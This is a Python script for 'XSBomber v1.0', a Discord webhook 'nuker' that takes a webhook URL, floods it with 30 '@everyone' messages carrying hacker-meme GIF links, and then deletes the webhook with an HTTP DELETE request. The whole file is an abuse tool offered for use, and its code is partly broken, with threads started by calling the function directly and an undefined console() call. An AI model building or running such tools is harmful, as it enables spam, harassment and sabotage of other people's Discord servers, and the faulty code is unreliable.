import time

import requests
import json
import threading
import os
import colorama
from colorama import *
from threading import *
import pystyle
from pystyle import *
import rich
from rich import *
while True:


    banner = """
    
 __   __ _____            ____                  _               
 \ \ / // ____|          |  _ \                | |              
  \ V /| (___    ______  | |_) | ___  _ __ ___ | |__   ___ _ __ 
   > <  \___ \  |______| |  _ < / _ \| '_ ` _ \| '_ \ / _ | '__|
  / . \ ____) |          | |_) | (_) | | | | | | |_) |  __| |   
 /_/ \_|_____/           |____/ \___/|_| |_| |_|_.__/ \___|_|  
                                                                                   
>>> github.com/XSBacon
    
    
    """
    console = get_console()
    print(Fore.BLUE + banner)
    def nuker():
        os.system(f'Title - XSBomber v1.0 - hit: {hit}')
        res = requests.post(webhooks1,  json={'username': 'XSBOMBER', 'content': '@everyone https://tenor.com/view/hacker-pc-meme-matrix-codes-gif-16730883 https://tenor.com/view/hack-pc-guy-fawkes-hacker-gif-17047231 https://tenor.com/view/hacker-typing-hacking-computer-codes-gif-17417874'})
        console.print("{[blue]![/blue]} Message sent to the webhook")
    threads = []
    webhooks1 = console.input("{[blue]?[/blue]} Enter the webhook to nuke : ")
    print()
    print()
    hit = 0
    for i in range(30):
        hit = hit + 1
        t = threading.Thread(target=nuker())
        threads.append(t)
        t.start()


    r = requests.delete(webhooks1)
    hit = 0

    print()
    print()
    console = console()
    console.print("{[red]![/red]} XSBOMBER v1.0")
    console.input("{[red]![/red]} Press enter to continue ")
    os.system('CLS || clear')
